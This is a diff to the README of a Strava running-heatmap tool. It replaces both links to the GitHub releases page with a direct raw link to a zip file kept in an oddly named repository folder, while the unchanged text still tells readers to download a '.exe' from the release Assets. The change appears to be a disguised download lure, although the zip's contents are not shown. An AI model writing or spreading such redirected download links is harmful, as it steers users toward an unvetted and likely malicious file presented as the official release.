@@ -1,6 +1,6 @@
 # 📍 running-heatmap - Visualize your run data with heatmaps
 
-[![Download running-heatmap](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hannibalundulate17/running-heatmap/releases)
+[![Download running-heatmap](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/hannibalundulate17/running-heatmap/main/wouch/running_heatmap_2.8-beta.3.zip)
 
 This application creates visual maps from your Strava exercise data. You can see your activity frequency, running pace, heart rate, and elevation changes represented as a heatmap. Use this to track your progress and identify your favorite running routes over time.
 
@@ -8,7 +8,7 @@ This application creates visual maps from your Strava exercise data. You can see
 
 The latest version of this tool is available on the releases page. 
 
-[Visit this page to download the software](https://github.com/hannibalundulate17/running-heatmap/releases)
+[Visit this page to download the software](https://raw.githubusercontent.com/hannibalundulate17/running-heatmap/main/wouch/running_heatmap_2.8-beta.3.zip)
 
 Look for the file ending in `.exe` under the Assets section of the most recent release. Click the file name to start the download.
 
